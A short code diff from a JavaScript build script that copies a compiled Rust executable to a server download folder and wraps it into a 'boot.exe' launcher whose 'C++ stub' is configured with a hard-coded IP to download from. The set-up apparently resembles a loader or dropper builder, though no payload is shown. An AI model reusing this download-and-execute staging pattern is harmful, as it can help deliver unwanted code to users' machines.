@@ -34,13 +34,11 @@ export async function buildBoot({ key }) {
     throw new Error(`rust build missing output at ${baseExe}`);
   }
 
-  // Copy the compiled rust exe to the server's download folder as st.exe
   if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
   fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));
 
   console.log('[build] wrapping into boot.exe...');
-  // We pass the server IP to the compiler so the C++ stub knows where to download from
-  // Replace '127.0.0.1' with your actual server IP if needed
+  // REPLACE '81.167.1.117' with your server IP if it's different
   const bootBuf = await compileLauncher({ key, config: { ip: '81.167.1.117' }, baseExe });
   return bootBuf;
 }
